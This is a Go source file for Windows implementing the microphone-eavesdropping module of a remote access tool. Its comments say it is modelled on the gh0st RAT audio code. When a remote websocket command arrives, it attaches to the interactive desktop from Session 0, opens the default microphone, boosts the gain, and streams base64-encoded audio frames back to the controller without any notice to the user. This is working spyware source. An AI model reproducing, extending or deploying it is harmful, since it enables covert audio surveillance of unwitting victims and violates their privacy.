//go:build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"unsafe"

	"github.com/gorilla/websocket"
)

// ═══ 麦克风监听模块 (Windows WaveIn API — 事件驱动模式) ═══
// 参考 gh0st RAT Audio.cpp 的 CALLBACK_THREAD + 事件方式
// 使用 CALLBACK_EVENT + WaitForSingleObject 替代轮询，消除延迟

var (
	modWinmm                = syscall.NewLazyDLL("winmm.dll")
	procWaveInGetNumDevs    = modWinmm.NewProc("waveInGetNumDevs")
	procWaveInOpen          = modWinmm.NewProc("waveInOpen")
	procWaveInPrepareHeader = modWinmm.NewProc("waveInPrepareHeader")
	procWaveInUnprepareHdr  = modWinmm.NewProc("waveInUnprepareHeader")
	procWaveInAddBuffer     = modWinmm.NewProc("waveInAddBuffer")
	procWaveInStart         = modWinmm.NewProc("waveInStart")
	procWaveInStop          = modWinmm.NewProc("waveInStop")
	procWaveInReset         = modWinmm.NewProc("waveInReset")
	procWaveInClose         = modWinmm.NewProc("waveInClose")

	modKernel32Mic          = syscall.NewLazyDLL("kernel32.dll")
	procLocalAllocM         = modKernel32Mic.NewProc("LocalAlloc")
	procLocalFreeM          = modKernel32Mic.NewProc("LocalFree")
	procCreateEventW        = modKernel32Mic.NewProc("CreateEventW")
	procWaitForSingleObject = modKernel32Mic.NewProc("WaitForSingleObject")
	procResetEvent          = modKernel32Mic.NewProc("ResetEvent")
	procCloseHandleMic      = modKernel32Mic.NewProc("CloseHandle")
)

const (
	waveMapper    = 0xFFFFFFFF // WAVE_MAPPER
	callbackEvent = 0x00050000 // CALLBACK_EVENT
	whdrDone      = 0x00000001 // WHDR_DONE
	waitObject0   = 0x00000000
	waitTimeout   = 0x00000102
)

type waveFormatEx struct {
	FormatTag      uint16
	Channels       uint16
	SamplesPerSec  uint32
	AvgBytesPerSec uint32
	BlockAlign     uint16
	BitsPerSample  uint16
	CbSize         uint16
}

type waveHdr struct {
	Data          uintptr
	BufferLength  uint32
	BytesRecorded uint32
	User          uintptr
	Flags         uint32
	Loops         uint32
	Next          uintptr
	Reserved      uintptr
}

var (
	micMu      sync.Mutex
	micRunning bool
	micStopCh  chan struct{}
	micConn    *websocket.Conn
	micWriteMu *sync.Mutex
)

func handleMicStart(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	micMu.Lock()
	defer micMu.Unlock()

	if micRunning {
		sendResult(conn, writeMu, "mic_start_result", msg.ID, `{"status":"already_running"}`)
		return
	}

	micRunning = true
	micConn = conn
	micWriteMu = writeMu
	micStopCh = make(chan struct{})

	go micStreamLoop()
	sendResult(conn, writeMu, "mic_start_result", msg.ID, `{"status":"started"}`)
}

func handleMicStop(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	micMu.Lock()
	defer micMu.Unlock()

	if !micRunning {
		sendResult(conn, writeMu, "mic_stop_result", msg.ID, `{"status":"not_running"}`)
		return
	}

	close(micStopCh)
	micRunning = false
	sendResult(conn, writeMu, "mic_stop_result", msg.ID, `{"status":"stopped"}`)
}

func micStreamLoop() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	// Session 0 修复：绑定到交互式桌面以访问音频设备
	attachToInteractiveDesktop()

	const (
		sampleRate    = 8000 // 8kHz (参考gh0st Audio.cpp, 减半带宽)
		bitsPerSample = 16
		channels      = 1
		bufferMs      = 100 // 100ms 小缓冲 = 低延迟
		numBuffers    = 4   // 4个缓冲区轮转
		micGain       = 3.0 // 适中增益，避免爆音失真
	)
	bufferSize := sampleRate * (bitsPerSample / 8) * channels * bufferMs / 1000

	numDevs, _, _ := procWaveInGetNumDevs.Call()
	if numDevs == 0 {
		sendResult(micConn, micWriteMu, "mic_frame", "", `{"error":"没有检测到麦克风设备"}`)
		micMu.Lock()
		micRunning = false
		micMu.Unlock()
		return
	}

	// 创建事件对象（用于 CALLBACK_EVENT 模式）
	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0) // auto-reset event
	if hEvent == 0 {
		sendResult(micConn, micWriteMu, "mic_frame", "", `{"error":"创建事件对象失败"}`)
		micMu.Lock()
		micRunning = false
		micMu.Unlock()
		return
	}
	defer procCloseHandleMic.Call(hEvent)

	fmt_ := waveFormatEx{
		FormatTag:      1, // PCM
		Channels:       channels,
		SamplesPerSec:  sampleRate,
		BitsPerSample:  bitsPerSample,
		BlockAlign:     channels * bitsPerSample / 8,
		AvgBytesPerSec: sampleRate * uint32(channels) * uint32(bitsPerSample) / 8,
		CbSize:         0,
	}

	// CALLBACK_EVENT 模式：缓冲区就绪时自动触发事件，无需轮询
	var hWaveIn uintptr
	hr, _, _ := procWaveInOpen.Call(
		uintptr(unsafe.Pointer(&hWaveIn)),
		uintptr(waveMapper),
		uintptr(unsafe.Pointer(&fmt_)),
		hEvent,
		0,
		callbackEvent,
	)
	if hr != 0 {
		sendResult(micConn, micWriteMu, "mic_frame", "",
			fmt.Sprintf(`{"error":"打开麦克风失败(错误%d)"}`, hr))
		micMu.Lock()
		micRunning = false
		micMu.Unlock()
		return
	}

	hdrSize := unsafe.Sizeof(waveHdr{})
	headers := make([]waveHdr, numBuffers)
	bufs := make([]uintptr, numBuffers)

	for i := 0; i < numBuffers; i++ {
		bufs[i], _, _ = procLocalAllocM.Call(0x0040, uintptr(bufferSize))
		headers[i] = waveHdr{
			Data:         bufs[i],
			BufferLength: uint32(bufferSize),
		}
		procWaveInPrepareHeader.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
		procWaveInAddBuffer.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
	}

	procWaveInStart.Call(hWaveIn)

	defer func() {
		procWaveInStop.Call(hWaveIn)
		procWaveInReset.Call(hWaveIn)
		for i := 0; i < numBuffers; i++ {
			procWaveInUnprepareHdr.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
			procLocalFreeM.Call(bufs[i])
		}
		procWaveInClose.Call(hWaveIn)
	}()

	stopCh := micStopCh

	for {
		// 检查是否停止
		select {
		case <-stopCh:
			return
		default:
		}

		// 等待事件触发（缓冲区就绪），超时50ms后检查stopCh
		ret, _, _ := procWaitForSingleObject.Call(hEvent, 50)
		if ret != waitObject0 && ret != waitTimeout {
			return // 异常
		}

		// 检查所有缓冲区
		for i := 0; i < numBuffers; i++ {
			if headers[i].Flags&whdrDone == 0 {
				continue
			}
			if headers[i].BytesRecorded == 0 {
				headers[i].Flags = 0
				procWaveInUnprepareHdr.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
				procWaveInPrepareHeader.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
				procWaveInAddBuffer.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
				continue
			}

			// 快速拷贝音频数据
			recorded := int(headers[i].BytesRecorded)
			data := make([]byte, recorded)
			src := (*[1 << 28]byte)(unsafe.Pointer(headers[i].Data))[:recorded:recorded]
			copy(data, src)

			// 软件增益
			applyGain(data, micGain)

			b64 := base64.StdEncoding.EncodeToString(data)
			payload, _ := json.Marshal(map[string]interface{}{
				"audio":    b64,
				"rate":     sampleRate,
				"bits":     bitsPerSample,
				"channels": channels,
				"samples":  recorded / (bitsPerSample / 8),
			})
			sendResult(micConn, micWriteMu, "mic_frame", "", string(payload))

			// 重新入队
			headers[i].Flags = 0
			headers[i].BytesRecorded = 0
			procWaveInUnprepareHdr.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
			procWaveInPrepareHeader.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
			procWaveInAddBuffer.Call(hWaveIn, uintptr(unsafe.Pointer(&headers[i])), uintptr(hdrSize))
		}
	}
}

// applyGain 对 PCM16LE 音频数据施加软件增益
func applyGain(data []byte, gain float64) {
	for i := 0; i+1 < len(data); i += 2 {
		sample := int16(uint16(data[i]) | uint16(data[i+1])<<8)
		amplified := int32(float64(sample) * gain)
		if amplified > 32767 {
			amplified = 32767
		}
		if amplified < -32768 {
			amplified = -32768
		}
		data[i] = byte(amplified)
		data[i+1] = byte(amplified >> 8)
	}
}
